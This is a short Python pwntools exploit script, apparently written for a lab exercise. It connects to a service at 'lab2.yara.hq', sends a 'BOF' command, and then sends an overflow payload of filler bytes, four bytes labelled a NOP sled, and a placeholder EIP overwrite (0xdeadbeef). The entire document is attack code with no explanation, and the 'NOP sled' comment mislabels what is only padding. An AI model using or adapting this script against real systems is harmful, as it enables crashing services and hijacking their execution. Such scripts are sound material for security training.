from pwn import *

host = "lab2.yara.hq"
port = 9999

payload = b"A" * 201         # Fill buffer
payload += b"\x90" * 4       # NOP sled
payload += p32(0xdeadbeef)   # EIP overwrite (little-endian)

r = remote(host, port)
r.recvuntil(b"> ")           # Wait for main menu prompt
r.sendline(b"BOF")           # Send BOF command
r.recvuntil(b"YOUR BUFFER > ")
r.send(payload)
print(r.recvall(timeout=2).decode(errors="ignore"))